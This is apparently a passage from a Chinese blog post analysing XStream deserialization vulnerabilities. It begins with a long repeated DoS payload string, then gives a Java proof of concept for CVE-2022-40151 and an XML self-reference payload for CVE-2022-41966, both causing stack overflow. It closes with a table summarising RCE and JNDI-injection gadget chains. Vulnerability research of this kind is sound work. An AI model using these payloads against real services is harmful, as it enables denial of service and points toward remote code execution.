llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l蟬chemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemclL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:sch*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:sche,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l蟬chemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemclL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:sch*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:sche,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(l*,(d*,(l*,(l*,(l*,(l*,(l*,(l??</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2022-40151"><a href="#CVE-2022-40151" class="headerlink" title="CVE-2022-40151"></a>CVE-2022-40151</h2><h3 id="分析-34"><a href="#分析-34" class="headerlink" title="分析"></a>分析</h3><p>同样也是DOS，当xml标签中存在重复嵌套时会不断递归解析造成堆栈溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">XStream xStream = new XStream();</span><br><span class="line">String xml = new String();</span><br><span class="line">int i = 0;</span><br><span class="line">for( ; i &lt; 10000; ++i) &#123;</span><br><span class="line">    xml += &quot;&lt;set&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">for( ; i &gt; 0; --i) &#123;</span><br><span class="line">    xml += &quot;&lt;/set&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(xml);</span><br><span class="line">xStream.fromXML(xml);</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141904321.png" alt="image-20230414190417230"></p>
<h2 id="CVE-2022-41966"><a href="#CVE-2022-41966" class="headerlink" title="CVE-2022-41966"></a>CVE-2022-41966</h2><h3 id="分析-35"><a href="#分析-35" class="headerlink" title="分析"></a>分析</h3><p>原理和CVE-2021-43859相同，也是引用导致重复计算哈希值，导致堆栈异常。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;set&gt;</span><br><span class="line">	&lt;set&gt;</span><br><span class="line">		&lt;string&gt;c&lt;/string&gt;</span><br><span class="line">		&lt;set reference=&#x27;../../../set/set&#x27;/&gt;</span><br><span class="line">	 &lt;/set&gt;</span><br><span class="line">&lt;/set&gt;</span><br></pre></td></tr></table></figure>

<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>终于肝完了，XStream的漏洞是真多，比FastJSON和Shiro都多。多亏后面搞了个白名单，不然又不知道多少RCE。</p>
<p>注：以下的入口点并非真正的入口点，只是方便区分各个漏洞不同的差别点。</p>
<table>
<thead>
<tr>
<th>CVE</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>版本 1.4.19</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2022-41966">CVE-2022-41966</a></td>
<td>若一些集合类型使用了引用，且引用的元素为自身，则会导致堆栈溢出，从而发生拒绝服务。</td>
</tr>
<tr>
<td><a href="#CVE-2022-40151">CVE-2022-40151</a></td>
<td>当xml标签中存在重复嵌套时会不断递归解析造成堆栈溢出，从而发生拒绝服务。</td>
</tr>
<tr>
<td><a href="#CVE-2022-40152">CVE-2022-40152</a></td>
<td>当XStream使用了Woodstox组件，且xml中包含许多左括号时，会递归调用该组件的FullDTDReader.java类的readContentSpec方法中，从而发生拒绝服务。</td>
</tr>
<tr>
<td>版本 1.4.18</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2021-43859">CVE-2021-43859</a></td>
<td>若一些集合类型使用了引用，且引用的元素为自身，则会导致堆栈溢出，从而发生拒绝服务。</td>
</tr>
<tr>
<td>版本 1.4.17</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2021-39139">CVE-2021-39139</a></td>
<td>jdk1.7u21下才能使用，AnnotationInvocationHandler的invoke方法作为入口点，它的equalsImpl方法反射执行指定方法，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39140">CVE-2021-39140</a></td>
<td>重复引用造成死循环，导致DOS。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39141">CVE-2021-39141</a></td>
<td>SEIStub作为入口点，MethodSetter触发sink，造成JNDI注入。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39144">CVE-2021-39144</a></td>
<td>NullProvider作为入口点，DTraceProbe触发sink，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39145">CVE-2021-39145</a></td>
<td>Packet作为入口点，LdapBindingEnumeration触发sink，从远程服务器拉取类并实例化，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39146">CVE-2021-39146</a></td>
<td>MultiUIDefaults作为入口点，ProxyLazyValuec触发sink，造成JNDI注入。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39147">CVE-2021-39147</a></td>
<td>Packet作为入口点，LdapSearchEnumeration触发sink，远程拉取工厂类并实例化，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39148">CVE-2021-39148</a></td>
<td>Packet作为入口点，ContinuationDirContext触发sink，远程拉取工厂类并实例化，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39149">CVE-2021-39149</a></td>
<td>CompositeInvocationHandlerImpl作为入口点，TemplatesImpl直接RCE。</td>
